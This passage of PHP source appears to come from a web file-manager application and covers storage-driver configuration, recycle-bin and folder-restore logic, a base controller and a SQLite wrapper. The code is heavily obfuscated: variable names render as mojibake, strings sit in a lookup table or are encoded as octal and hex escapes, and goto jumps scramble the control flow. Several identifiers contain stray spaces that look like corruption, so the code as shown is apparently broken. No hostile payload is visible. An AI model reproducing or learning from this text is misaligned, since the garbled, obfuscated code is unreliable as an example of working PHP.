$Aç”Ãƒ§Ì->sourceInfo($aÏ‡ÔŸª); $AÎÆÃ±°Â¥ = $Aç”Ãƒ§Ì->sourceInfo($d¾Ûõ«ÏÂØ[$aîŸ›¹êÚ¯[476]]); goto aÓÍâÑªè…; AŸÙ‚øÑğ„: } goto BØ¸‘ˆÆØé; B“×÷Ù»°Ò: } private function restoreFolderChildren($dÏ®·¥¹Â‡, $A¸§ï‰Ş¿ù) { goto DˆŒ°åÑ¤É; C¡‘õÇñÏæ: $Aó¯ÛŒä­[$BÄùÍÙó¾•[394]][1] = array_unique($Aó¯ÛŒä­[$BÄùÍÙó¾•[394]][1]); $Aó¯ÛŒä­[$BÄùÍÙó¾•[941]] = $BÄùÍÙó¾•[1758]; $fÕÇ¢Ú²ÇÎ->where($Aó¯ÛŒä­)->setField($BÄùÍÙó¾•[421], 1); goto cØ¥¹ƒê¿²; DˆŒ°åÑ¤É: $BÄùÍÙó¾• =& $_SERVER[Ïº«‚ßèÔˆø]; $fÕÇ¢Ú²ÇÎ = Model($BÄùÍÙó¾•[1187]); $Aó¯ÛŒä­ = array($BÄùÍÙó¾•[394] => array($BÄùÍÙó¾•[7], array())); goto A×Â¥ØËˆî; A×Â¥ØËˆî: foreach ($A¸§ï‰Ş¿ù as $D¥ºÌ××«) { if ($D¥ºÌ××« == $dÏ®·¥¹Â‡) { continue; } if (!$fÕÇ¢Ú²ÇÎ->isParentOf($dÏ®·¥¹Â‡, $D¥ºÌ××«)) { continue; } $cİï¢‹÷Œ = $fÕÇ¢Ú²ÇÎ->sourceInfo($D¥ºÌ××«); if ($cİï¢‹÷Œ[$BÄùÍÙó¾•[401]] == $BÄùÍÙó¾•[87]) { $Aó¯ÛŒä­[] = array($BÄùÍÙó¾•[552] => array($BÄùÍÙó¾•[511], $cİï¢‹÷Œ[$BÄùÍÙó¾•[485]] . $D¥ºÌ××« . $BÄùÍÙó¾•[512])); } else { $Aó¯ÛŒä­[$BÄùÍÙó¾•[394]][1][] = $D¥ºÌ××«; } } if (!$Aó¯ÛŒä­[$BÄùÍÙó¾•[394]][1]) { unset($Aó¯ÛŒä­[$BÄùÍÙó¾•[394]]); } if (!$Aó¯ÛŒä­) { return; } goto C¡‘õÇñÏæ; cØ¥¹ƒê¿²: } private function recycleMove($f‚”›ÇÉ„Ì, $C…ìÍØ†ª‡ = 1) { $eßâŒÂ‡º¡ =& $_SERVER[Ïº«‚ßèÔˆø]; $D”š™ëÓÔ = Model($eßâŒÂ‡º¡[1187]); $c“®›³—³Ä = Model($eßâŒÂ‡º¡[1967]); $E™”„Šê¯Œ = array($eßâŒÂ‡º¡[394] => $f‚”›ÇÉ„Ì); if ($C…ìÍØ†ª‡) { $D”š™ëÓÔ->where($E™”„Šê¯Œ)->setField($eßâŒÂ‡º¡[421], 1); $c“®›³—³Ä->eventRecycle($f‚”›ÇÉ„Ì, $eßâŒÂ‡º¡[1968]); } else { $cÄñÆ’£ƒå = $D”š™ëÓÔ->where($E™”„Šê¯Œ)->find(); $fïØå®õ¹ = $cÄñÆ’£ƒå[$eßâŒÂ‡º¡[401]] == $eßâŒÂ‡º¡[87]; $A‚Õ³ÔÙ = $D”š™ëÓÔ->fileNameAuto($cÄñÆ’£ƒå[$eßâŒÂ‡º¡[476]], $cÄñÆ’£ƒå[$eßâŒÂ‡º¡[28]], REPEAT_RENAME_FOLDER, $fïØå®õ¹); if ($A‚Õ³ÔÙ != $cÄñÆ’£ƒå[$eßâŒÂ‡º¡[28]]) { $D”š™ëÓÔ->rename($f‚”›ÇÉ„Ì, $A‚Õ³ÔÙ); } $D”š™ëÓÔ->where($E™”„Šê¯Œ)->setField($eßâŒÂ‡º¡[421], 0); $c“®›³—³Ä->eventRecycle($f‚”›ÇÉ„Ì, $eßâŒÂ‡º¡[1969]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\163\164\x6f\162\x61\x67\x65\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x73\151\172\145\x4d\141\x78", "\163\171\x73\164\x65\x6d", "\144\x65\x66\x61\x75\x6c\164", "\x64\162\151\166\145\x72", "\x63\157\x6e\x66\x69\147"); public function listData($aˆê‹ÇŸÄ‡ = false, $E÷Îİ¿£± = "\155\157\144\x69\x66\x79\x54\151\x6d\145", $CÚ–Âå†Œ© = false) { $F™´éö±£Ê =& $_SERVER[Ïº«‚ßèÔˆø]; $eĞƒö²ä = parent::listData($aˆê‹ÇŸÄ‡, $E÷Îİ¿£±, $CÚ–Âå†Œ©); if ($aˆê‹ÇŸÄ‡) { return $eĞƒö²ä; } $aî¸ÏêÚÇÍ = $this->ioSizeUseGet(array_to_keyvalue($eĞƒö²ä, $F™´éö±£Ê[33], $F™´éö±£Ê[392])); foreach ($eĞƒö²ä as $E’ê‹Úœ => $a… İÔÚ’¦) { unset($eĞƒö²ä[$E’ê‹Úœ][$F™´éö±£Ê[6]]); $eĞƒö²ä[$E’ê‹Úœ][$F™´éö±£Ê[1657]] = isset($aî¸ÏêÚÇÍ[$a… İÔÚ’¦[$F™´éö±£Ê[392]]]) ? $aî¸ÏêÚÇÍ[$a… İÔÚ’¦[$F™´éö±£Ê[392]]] : 0; } return $eĞƒö²ä; } public function ioSizeUseGet($cŞ‹ïÁ•‡¶) { goto C¿±ºŞ¡÷ª; d‡©Ç“º¾Î: $bÑ¤ë…±áÃ = Cache::get($EâÊª‹Ö‰); if ($bÑ¤ë…±áÃ) { return $bÑ¤ë…±áÃ; } $DóÉ¶ØÍ† = array($e¡¦ã¬ŒÃ[774] => $e¡¦ã¬ŒÃ[392], $e¡¦ã¬ŒÃ[1971] => $e¡¦ã¬ŒÃ[78]); goto dëôµËÄø÷; dëôµËÄø÷: $B‡Ç“ÅÖ× = array($e¡¦ã¬ŒÃ[774] => array($e¡¦ã¬ŒÃ[7], $cŞ‹ïÁ•‡¶)); $bÑ¤ë…±áÃ = Model($e¡¦ã¬ŒÃ[731])->field($DóÉ¶ØÍ†)->where($B‡Ç“ÅÖ×)->group($e¡¦ã¬ŒÃ[774])->select(); $bÑ¤ë…±áÃ = array_to_keyvalue($bÑ¤ë…±áÃ, $e¡¦ã¬ŒÃ[392], $e¡¦ã¬ŒÃ[78]); goto AˆÜÛèÉ‡–; C¿±ºŞ¡÷ª: $e¡¦ã¬ŒÃ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$cŞ‹ïÁ•‡¶) { return array(); } $EâÊª‹Ö‰ = $e¡¦ã¬ŒÃ[1970] . implode($e¡¦ã¬ŒÃ[47], $cŞ‹ïÁ•‡¶); goto d‡©Ç“º¾Î; AˆÜÛèÉ‡–: Cache::set($EâÊª‹Ö‰, $bÑ¤ë…±áÃ, 600); return $bÑ¤ë…±áÃ; goto d¤¾¾ÄŞ•±; d¤¾¾ÄŞ•±: } public function getConfig($F°»• ’¸) { $bäó«õÉÍƒ = parent::listData($F°»• ’¸); return json_decode($bäó«õÉÍƒ[$_SERVER[Ïº«‚ßèÔˆø][6]], !0); } public function update($A¯‚šÓÌ§¿, $FìÓÒ˜×„ø) { goto a×í§ ”; E… £Ì ²: $câÆ¬ªä¥¼ = parent::update($A¯‚šÓÌ§¿, $FìÓÒ˜×„ø); if ($câÆ¬ªä¥¼ && $FìÓÒ˜×„ø[$E‘ÙŒõ¬åê[34]]) { foreach ($AÔÍ¹×Šˆœ as $d‰ áç¥àÊ) { if ($d‰ áç¥àÊ[$E‘ÙŒõ¬åê[34]] && $d‰ áç¥àÊ[$E‘ÙŒõ¬åê[392]] != $A¯‚šÓÌ§¿) { parent::update($d‰ áç¥àÊ[$E‘ÙŒõ¬åê[392]], array($E‘ÙŒõ¬åê[34] => 0)); } } } return $câÆ¬ªä¥¼; goto DãîóÈ¿¸; Aè÷‡µ‘à: if (isset($AÔÍ¹×Šˆœ[$bÉ¬§†Îìˆ]) && $AÔÍ¹×Šˆœ[$bÉ¬§†Îìˆ][$E‘ÙŒõ¬åê[392]] != $A¯‚šÓÌ§¿) { return !1; } if (isset($FìÓÒ˜×„ø[$E‘ÙŒõ¬åê[1972]]) && $FìÓÒ˜×„ø[$E‘ÙŒõ¬åê[1972]] == $E‘ÙŒõ¬åê[87]) { $this->checkConfig($FìÓÒ˜×„ø); } unset($FìÓÒ˜×„ø[$E‘ÙŒõ¬åê[1972]]); goto E… £Ì ²; a×í§ ”: $E‘ÙŒõ¬åê =& $_SERVER[Ïº«‚ßèÔˆø]; $bÉ¬§†Îìˆ = $FìÓÒ˜×„ø[$E‘ÙŒõ¬åê[28]]; $AÔÍ¹×Šˆœ = array_to_keyvalue(parent::listData(), $E‘ÙŒõ¬åê[28]); goto Aè÷‡µ‘à; DãîóÈ¿¸: } public function add($FÌïŞäÓ°¶) { goto AƒÊ¾áŒ£; b·†œ‚áö: return $Eø‡¤ÅˆÇñ; goto cÚ²Õ®¹ùŸ; AƒÊ¾áŒ£: $EÜ‘Ó‹ô =& $_SERVER[Ïº«‚ßèÔˆø]; $A™ ¢¹ƒµ‹ = array_to_keyvalue(parent::listData(), $EÜ‘Ó‹ô[28]); if (isset($A™ ¢¹ƒµ‹[$FÌïŞäÓ°¶[$EÜ‘Ó‹ô[28]]])) { return !1; } goto eğñ©Í”´; eğñ©Í”´: $this->checkConfig($FÌïŞäÓ°¶); $Eø‡¤ÅˆÇñ = parent::insert($FÌïŞäÓ°¶); if ($Eø‡¤ÅˆÇñ && $FÌïŞäÓ°¶[$EÜ‘Ó‹ô[34]]) { foreach ($A™ ¢¹ƒµ‹ as $Aè÷²…) { if ($Aè÷²…[$EÜ‘Ó‹ô[34]]) { parent::update($Aè÷²…[$EÜ‘Ó‹ô[392]], array($EÜ‘Ó‹ô[34] => 0)); } } } goto b·†œ‚áö; cÚ²Õ®¹ùŸ: } public function checkConfig(&$eÛŸĞƒ•Û¡) { goto bËš¶æÍœ»; aË¾µÑì‘î: foreach ($Eº³Å§ĞØ‡ as $F®‹•”¶ò => $Dù¤¿ ÷‹«) { $Eº³Å§ĞØ‡[$F®‹•”¶ò] = trim($Dù¤¿ ÷‹«); } $Eº³Å§ĞØ‡[$f¶ç¶‚ğ‹[1973]] = rand_string(6); $F¶ğ‡¼æ¢Ç = $GLOBALS[$f¶ç¶‚ğ‹[6]][$f¶ç¶‚ğ‹[88]][$f¶ç¶‚ğ‹[783]]; goto EÊŠ–”²‘; bËš¶æÍœ»: $f¶ç¶‚ğ‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $FæÔÉ“ÑœÃ = strtolower($eÛŸĞƒ•Û¡[$f¶ç¶‚ğ‹[94]]); $Eº³Å§ĞØ‡ = json_decode($eÛŸĞƒ•Û¡[$f¶ç¶‚ğ‹[6]], !0); goto aË¾µÑì‘î; EÊŠ–”²‘: $Aì¸®ò† = isset($F¶ğ‡¼æ¢Ç[$FæÔÉ“ÑœÃ]) ? $F¶ğ‡¼æ¢Ç[$FæÔÉ“ÑœÃ] : ucfirst($FæÔÉ“ÑœÃ); $D‚ØçË¬æ« = $f¶ç¶‚ğ‹[72] . $Aì¸®ò†; if (!$Aì¸®ò† || !class_exists($D‚ØçË¬æ«)) { write_log(array($f¶ç¶‚ğ‹[1974], $eÛŸĞƒ•Û¡, get_caller_info()), $f¶ç¶‚ğ‹[1975]); show_json(LNG($f¶ç¶‚ğ‹[1976]), !1, $eÛŸĞƒ•Û¡); } goto dæŠïç«É; dæŠïç«É: $A¤áÕ¾Ó«Ê = new $D‚ØçË¬æ«($Eº³Å§ĞØ‡); if (in_array($FæÔÉ“ÑœÃ, $A¤áÕ¾Ó«Ê->objectDriver)) { if (!$A¤áÕ¾Ó«Ê->isBucketCors() && !$A¤áÕ¾Ó«Ê->setBucketCors()) { $bï‡‚Ù÷‡ = LNG($f¶ç¶‚ğ‹[1977]); $bï‡‚Ù÷‡ .= $f¶ç¶‚ğ‹[1978] . LNG($f¶ç¶‚ğ‹[1979]); show_json($bï‡‚Ù÷‡, !1); } } $a‹æ®†Ë”Œ = rtrim($Eº³Å§ĞØ‡[$f¶ç¶‚ğ‹[1059]], $f¶ç¶‚ğ‹[8]) . $f¶ç¶‚ğ‹[8]; goto Dñ©„«‘äª; Dñ©„«‘äª: $D¤ŞÜ¼ÊÆ = $A¤áÕ¾Ó«Ê->getPath($a‹æ®†Ë”Œ . $f¶ç¶‚ğ‹[1120]); if (!$A¤áÕ¾Ó«Ê->mkfile($D¤ŞÜ¼ÊÆ)) { show_json(LNG($f¶ç¶‚ğ‹[1977]), !1); } $Eº³Å§ĞØ‡[$f¶ç¶‚ğ‹[1059]] = $a‹æ®†Ë”Œ; goto BÖ¥õ‘£‰; BÖ¥õ‘£‰: $eÛŸĞƒ•Û¡[$f¶ç¶‚ğ‹[6]] = json_encode($Eº³Å§ĞØ‡); $eÛŸĞƒ•Û¡[$f¶ç¶‚ğ‹[94]] = $Aì¸®ò†; return !0; goto c‘×ì‚Æ‹¬; c‘×ì‚Æ‹¬: } public function driverListSystem() { $CŒò°Öô°˜ =& $_SERVER[Ïº«‚ßèÔˆø]; $cöã†É²õŒ = parent::listData(); $C—ˆ•¾Ú¬ = array(); foreach ($cöã†É²õŒ as $Eö¼©ìÀÈİ) { unset($Eö¼©ìÀÈİ[$CŒò°Öô°˜[193]], $Eö¼©ìÀÈİ[$CŒò°Öô°˜[84]]); $Eö¼©ìÀÈİ[$CŒò°Öô°˜[6]] = json_decode($Eö¼©ìÀÈİ[$CŒò°Öô°˜[6]], !0); $C—ˆ•¾Ú¬[] = $Eö¼©ìÀÈİ; } return $C—ˆ•¾Ú¬; } public function defaultDriver() { $CÔŠä«¬ë =& $_SERVER[Ïº«‚ßèÔˆø]; $eÑ¾¨»«†Î = parent::listData(); $D•Šãİãİ„ = array_filter_by_field($eÑ¾¨»«†Î, $CÔŠä«¬ë[34], 1); $D•Šãİãİ„ = $D•Šãİãİ„[0]; if ($D•Šãİãİ„) { $D•Šãİãİ„[$CÔŠä«¬ë[6]] = json_decode($D•Šãİãİ„[$CÔŠä«¬ë[6]], !0); } return $D•Šãİãİ„; } public function driverInfo($B¹¼¼‹†š‘) { $eàÁÚÈ‚‚Î =& $_SERVER[Ïº«‚ßèÔˆø]; $b¶òõİæÌÚ = array_to_keyvalue(parent::listData(), $eàÁÚÈ‚‚Î[392]); if (!isset($b¶òõİæÌÚ[$B¹¼¼‹†š‘])) { return !1; } $B“‘±²ÎÍ¢ = $b¶òõİæÌÚ[$B¹¼¼‹†š‘]; $B“‘±²ÎÍ¢[$eàÁÚÈ‚‚Î[6]] = json_decode($B“‘±²ÎÍ¢[$eàÁÚÈ‚‚Î[6]], !0); return $B“‘±²ÎÍ¢; } public function remove($B³‰íÃáä) { $this->removeShareItems($B³‰íÃáä); return parent::remove($B³‰íÃáä); } public function removeWithFile($Dº‘ßš©š§, $C¦Š¸„ï†) { goto aµÅÜÃ¢š‚; CÏ´‘à„Ë: if (!$E™®Û„°©¬) { $bŒÉÕŒØÎ->stop($F¦Õ´ÉÊ…­); return !1; } $bŒÉÕŒØÎ->end(); if ($C¦Š¸„ï† == $CÙê¼‹˜å‘[1637]) { $this->remove($Dº‘ßš©š§); } goto Eâ”œÍÙ›ñ; aµÅÜÃ¢š‚: $CÙê¼‹˜å‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $BÑ‡Òòøê× = array($CÙê¼‹˜å‘[774] => $Dº‘ßš©š§); $dâõÄãåÆ– = Model($CÙê¼‹˜å‘[448])->where($BÑ‡Òòøê×)->count(); goto a÷ª©´•¦; DãàˆŒÉƒê: $bŒÉÕŒØÎ->task[$CÙê¼‹˜å‘[707]] = (double) $FÓï¯’çŒÚ; $D²µä¯˜«ğ = KodIO::defaultDriver(); $E†˜£íÖÕ– = $D²µä¯˜«ğ[$CÙê¼‹˜å‘[392]]; goto Dˆ¸„èœ’µ; e­Ş‰×•‘Ä: $bãëñø’œ¦ = Model($CÙê¼‹˜å‘[192])->where($BÑ‡Òòøê×)->field($CÙê¼‹˜å‘[1982])->select(); foreach ($bãëñø’œ¦ as $e†ö¥ùİÂ½) { goto A×È¿²ªÊ”; CÓ„ëŠĞñ: if (IO::exist($a¿ÌÆÕ®§°)) { $bŒÉÕŒØÎ->updateFileEnd($e†ö¥ùİÂ½[$CÙê¼‹˜å‘[28]], $e†ö¥ùİÂ½[$CÙê¼‹˜å‘[78]]); continue; } if (!IO::move($DÈ ˜Š¢Î, get_path_father($a¿ÌÆÕ®§°))) { $E™®Û„°©¬ = !1; break; } $BÑ‡Òòøê× = array($CÙê¼‹˜å‘[445] => $e†ö¥ùİÂ½[$CÙê¼‹˜å‘[445]]); goto c’èŒ¯ÚªÀ; A×È¿²ªÊ”: $DÈ ˜Š¢Î = $e†ö¥ùİÂ½[$CÙê¼‹˜å‘[76]]; $a¿ÌÆÕ®§° = $A©›Ş±åø . str_replace("\173\x69\x6f\x3a{$Dº‘ßš©š§}\x7d\x2f", $CÙê¼‹˜å‘[33], $DÈ ˜Š¢Î); if (!IO::exist($DÈ ˜Š¢Î)) { $BÆ±ˆì•õÂ[] = $e†ö¥ùİÂ½[$CÙê¼‹˜å‘[445]]; $bŒÉÕŒØÎ->updateFileEnd($e†ö¥ùİÂ½[$CÙê¼‹˜å‘[28]], $e†ö¥ùİÂ½[$CÙê¼‹˜å‘[78]]); continue; } goto CÓ„ëŠĞñ; c’èŒ¯ÚªÀ: $AñŒŠØ˜¾â = array($CÙê¼‹˜å‘[774] => $E†˜£íÖÕ–, $CÙê¼‹˜å‘[76] => $a¿ÌÆÕ®§°); Model($CÙê¼‹˜å‘[192])->where($BÑ‡Òòøê×)->save($AñŒŠØ˜¾â); goto B¨×š¦‘ã ; B¨×š¦‘ã : } $this->removeByFileID($BÆ±ˆì•õÂ); goto CÏ´‘à„Ë; a÷ª©´•¦: $FÓï¯’çŒÚ = Model($CÙê¼‹˜å‘[448])->where($BÑ‡Òòøê×)->sum($CÙê¼‹˜å‘[78]); $F¦Õ´ÉÊ…­ = $C¦Š¸„ï† . $CÙê¼‹˜å‘[1980] . $Dº‘ßš©š§; $bŒÉÕŒØÎ = new TaskFileTransfer($F¦Õ´ÉÊ…­, $CÙê¼‹˜å‘[1975], $dâõÄãåÆ–, LNG($CÙê¼‹˜å‘[1981]) . "\x28{$Dº‘ßš©š§}\51"); goto DãàˆŒÉƒê; Dˆ¸„èœ’µ: $A©›Ş±åø = "\173\151\157\x3a{$E†˜£íÖÕ–}\x7d\57"; $E™®Û„°©¬ = !0; $BÆ±ˆì•õÂ = array(); goto e­Ş‰×•‘Ä; Eâ”œÍÙ›ñ: } public function progress($Dİ™±‹˜ƒ, $eÒ™ô÷ä¯ï) { return Task::get($eÒ™ô÷ä¯ï . $_SERVER[Ïº«‚ßèÔˆø][1980] . $Dİ™±‹˜ƒ); } private function removeByFileID($CÑœ‹‰Ö¯å = array()) { goto båŠÈÉïÕ; FË…°òòİ§: $d²×­‰¤æó = Model($dîÍ´Šáº‘[1187])->where($C¨”µÆæá)->field($dîÍ´Šáº‘[394])->select(); if (!$d²×­‰¤æó) { return; } $d²×­‰¤æó = array_to_keyvalue($d²×­‰¤æó, $dîÍ´Šáº‘[33], $dîÍ´Šáº‘[394]); goto eìˆ©‡‚’; eìˆ©‡‚’: foreach ($d²×­‰¤æó as $f„“ˆ¥¹©) { Model($dîÍ´Šáº‘[407])->removeNow($f„“ˆ¥¹©, !1); } goto A…ÊÑÒæÕ; båŠÈÉïÕ: $dîÍ´Šáº‘ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($CÑœ‹‰Ö¯å)) { return; } $C¨”µÆæá = array($dîÍ´Šáº‘[445] => array($dîÍ´Šáº‘[7], $CÑœ‹‰Ö¯å)); goto FË…°òòİ§; A…ÊÑÒæÕ: } private function removeShareItems($dçé¢ƒÚ§ç) { goto a£«¨éÁÆ¶; E×±‚àÏÚ¸: $fàéêÒŠµ© = Model($Aê…”ôÈ³[1648])->where($aÊ×½ˆœä)->field($Aê…”ôÈ³[466])->select(); if (empty($fàéêÒŠµ©)) { return; } $fç¸¶ˆÀ Ö = array_to_keyvalue($fàéêÒŠµ©, $Aê…”ôÈ³[33], $Aê…”ôÈ³[466]); goto B¥î‰²£Ÿï; a£«¨éÁÆ¶: $Aê…”ôÈ³ =& $_SERVER[Ïº«‚ßèÔˆø]; $bã„´¶÷¶ = "\x7b\x69\157\x3a{$dçé¢ƒÚ§ç}\x7d\57"; $aÊ×½ˆœä = array($Aê…”ôÈ³[394] => 0, $Aê…”ôÈ³[1054] => array($Aê…”ôÈ³[379], "{$bã„´¶÷¶}\45")); goto E×±‚àÏÚ¸; B¥î‰²£Ÿï: Model($Aê…”ôÈ³[562])->remove($fç¸¶ˆÀ Ö); goto A‚«ã½Ò­; A‚«ã½Ò­: } } goto FÔÄ«ä·Ûç; DßÂí£¨²¤: function binCheckBigger($d‘âÓ¤¶Œ‹, $EÀ‘Û£îß¥) { return $d‘âÓ¤¶Œ‹ > $EÀ‘Û£îß¥; } $_SERVER[$_SERVER[»ã][3]] = ("\71\60\66\61"."\x37\x37")+0;$_vc3g="v6fZVHKhUa9fsS7ggn8p4ViiaiyKunSR5fxFKNp6rZ9YTzGNzhID4cQh96MbsBXRDzu36WsAjmsPVgv5";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($eŞ†õ¡ÎÉ·, $BóŞÆª¤ô) { $EÇñÉ°Ìë– =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset(self::$_methodList[$eŞ†õ¡ÎÉ·])) { return @call_user_func_array(self::$_methodList[$eŞ†õ¡ÎÉ·], $BóŞÆª¤ô); } else { if (method_exists($this, $eŞ†õ¡ÎÉ·)) { return call_user_func_array(array($this, $eŞ†õ¡ÎÉ·), $BóŞÆª¤ô); } else { think_exception(__CLASS__ . $EÇñÉ°Ìë–[4] . $eŞ†õ¡ÎÉ· . $EÇñÉ°Ìë–[5]); } } } public static function __callStatic($cå‡ÕŞ©, $DÁ±³½Âõ‹) { if (isset(self::$_methodListStatic[$cå‡ÕŞ©])) { return call_user_func_array(self::$_methodListStatic[$cå‡ÕŞ©], $DÁ±³½Âõ‹); } else { if (method_exists(self, $cå‡ÕŞ©)) { return call_user_func_array(array(self, $cå‡ÕŞ©), $DÁ±³½Âõ‹); } else { show_json("{$cå‡ÕŞ©}\50\51\40\x6e\x6f\164\40\145\170\151\163\x74\x3b", !1); } } } public static function addMethod($CÍÌ‡ ±Ü, $EÓ§­ê¸Ù) { self::$_methodList[$CÍÌ‡ ±Ü] = $EÓ§­ê¸Ù; } public static function addMethodStatic($F†Ñ‚Û¼‚Ó, $BòÊ´¿«À”) { self::$_methodListStatic[$F†Ñ‚Û¼‚Ó] = $BòÊ´¿«À”; } } goto cË…‘ÁÇ÷å; cË…‘ÁÇ÷å: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto aÕÔ‹áè†ß; fğóÎ®©è©: $this->in =& $in; $this->values[$FáØä–§õ [6]] =& $config; $this->values[$FáØä–§õ [7]] =& $in; goto b‰·Û—©Ö; aÕÔ‹áè†ß: $FáØä–§õ  =& $_SERVER[Ïº«‚ßèÔˆø]; global $in, $config; $this->config =& $config; goto fğóÎ®©è©; b‰·Û—©Ö: $this->tpl = TEMPLATE . MOD . $FáØä–§õ [8]; $this->_classObjectID = mt_rand(0, 10000); goto Dá†¾Öçëä; Dá†¾Öçëä: } public function loadClass($C¡Œá–¶…) { if (1 === func_num_args()) { $this->{$C¡Œá–¶…} = new $C¡Œá–¶…(); } else { $b¨ˆ±Ëß©„ = new ReflectionClass($C¡Œá–¶…); $BèÂ‘¨İöŒ = func_get_args(); array_shift($BèÂ‘¨İöŒ); $this->{$C¡Œá–¶…} = $b¨ˆ±Ëß©„->newInstanceArgs($BèÂ‘¨İöŒ); } return $this->{$C¡Œá–¶…}; } protected function assign($d‹ç÷Ç©Â, $c½Œ”†äÍ) { $this->values[$d‹ç÷Ç©Â] = $c½Œ”†äÍ; } protected function display($b©µÂ„«Ÿõ) { ob_end_clean(); extract($this->values); require $this->tpl . $b©µÂ„«Ÿõ; } } class DbSqliteBase extends Db { public function __construct($dè‚“Ûì = '') { $E‰®“ŠÕ ± =& $_SERVER[Ïº«‚ßèÔˆø]; if (!extension_loaded($E‰®“ŠÕ ±[9])) { think_exception(think_lang($E‰®“ŠÕ ±[10]) . $E‰®“ŠÕ ±[11]); } if (!empty($dè‚“Ûì)) { if (!isset($dè‚“Ûì[$E‰®“ŠÕ ±[12]])) { $dè‚“Ûì[$E‰®“ŠÕ ±[12]] = 438; } $this->config = $dè‚“Ûì; if (empty($this->config[$E‰®“ŠÕ ±[13]])) { $this->config[$E‰®“ŠÕ ±[13]] = array(); } } } public function connect($b‹’•ï÷’ = '', $E±ğèù£ã° = 0) { $B¤‘ÀÛƒÆÈ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->linkID[$E±ğèù£ã°])) { goto eêäÂ»Ê¡Ø; cÆœéÂ†Ï: @sqlite_busy_timeout($this->linkID[$E±ğèù£ã°], 30000); if (1 != think_config($B¤‘ÀÛƒÆÈ[18])) { unset($this->config); } goto eÏ´²Ï÷Çö; eêäÂ»Ê¡Ø: if (empty($b‹’•ï÷’)) { $b‹’•ï÷’ = $this->config; } $EĞë£ÛùŒğ = !empty($b‹’•ï÷’[$B¤‘ÀÛƒÆÈ[13]][$B¤‘ÀÛƒÆÈ[14]]) ? $b‹’•ï÷’[$B¤‘ÀÛƒÆÈ[13]][$B¤‘ÀÛƒÆÈ[14]] : $this->pconnect; $bùôÓßÒ‹ = $EĞë£ÛùŒğ ? $B¤‘ÀÛƒÆÈ[15] : $B¤‘ÀÛƒÆÈ[16]; goto D„æáªˆ—í; D„æáªˆ—í: $this->linkID[$E±ğèù£ã°] = $bùôÓßÒ‹($b‹’•ï÷’[$B¤‘ÀÛƒÆÈ[17]], $b‹’•ï÷’[$B¤‘ÀÛƒÆÈ[12]]); if (!$this->linkID[$E±ğèù£ã°]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cÆœéÂ†Ï; eÏ´²Ï÷Çö: } return $this->linkID[$E±ğèù£ã°]; } public function free() { $this->queryID = null; } public function query($f—¡Ùµ¦©Ê) { goto AÒŞŠéë ñ; AÒŞŠéë ñ: $d¼ØªÄ…˜Š =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fÅ’ÇöÂ¹; fÅ’ÇöÂ¹: $this->queryStr = $f—¡Ùµ¦©Ê; if ($this->queryID) { $this->free(); } think_action_status($d¼ØªÄ…˜Š[19], 1); goto B´¬‚ß“ƒ‚; B´¬‚ß“ƒ‚: think_status($d¼ØªÄ…˜Š[20]); $this->queryID = sqlite_query($this->_linkID, $f—¡Ùµ¦©Ê); $this->debug(); goto dÀ¯Â“…ô; dÀ¯Â“…ô: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $BÁ²•†òÓ = $this->getAll(); return $BÁ²•†òÓ; } goto B„”…Â¨İŞ; B„”…Â¨İŞ: } public function execute($bœ‘ŠÄİ‡) { goto AÎğº„†ŒŠ; F¾æÖ‚µñ : if (!1 === $C²æ¤ØÖ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto E¦­Ö›ªó; d—õ„ÃÎÄÇ: think_status($CéÎªËÊ£¨[20]); $C²æ¤ØÖ = sqlite_exec($this->_linkID, $bœ‘ŠÄİ‡); $this->debug(); goto F¾æÖ‚µñ ; AÎğº„†ŒŠ: $CéÎªËÊ£¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c—¥¢Ä•§; c—¥¢Ä•§: $this->queryStr = $bœ‘ŠÄİ‡; if ($this->queryID) { $this->free(); } think_action_status($CéÎªËÊ£¨[21], 1); goto d—õ„ÃÎÄÇ; E¦­Ö›ªó: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ïº«‚ßèÔˆø][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÒÔƒÒ×š = sqlite_query($this->_linkID, $_SERVER[Ïº«‚ßèÔˆø][23]); if (!$eÒÔƒÒ×š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÁó‚ÑóÀ« = sqlite_query($this->_linkID, $_SERVER[Ïº«‚ßèÔˆø][24]); if (!$eÁó‚ÑóÀ«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e©¢Å¡åç = array(); if ($this->numRows > 0) { for ($Bõ«èŠÎñ¾ = 0; $Bõ«èŠÎñ¾ < $this->numRows; $Bõ«èŠÎñ¾++) { $e©¢Å¡åç[$Bõ«èŠÎñ¾] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $e©¢Å¡åç; } public function getFields($D¡©÷¿ë´Ç) { $BáÁæŒ›Â =& $_SERVER[Ïº«‚ßèÔˆø]; $B‚…ßÏ‚…“ = $this->query($BáÁæŒ›Â[25] . $D¡©÷¿ë´Ç . $BáÁæŒ›Â[26]); $aôˆŠÃ‰Î = array(); if ($B‚…ßÏ‚…“) { foreach ($B‚…ßÏ‚…“ as $Aæö½­ÛÜĞ => $bÌßÏİ¬ˆ–) { $aôˆŠÃ‰Î[$bÌßÏİ¬ˆ–[$BáÁæŒ›Â[27]]] = array($BáÁæŒ›Â[28] => $bÌßÏİ¬ˆ–[$BáÁæŒ›Â[27]], 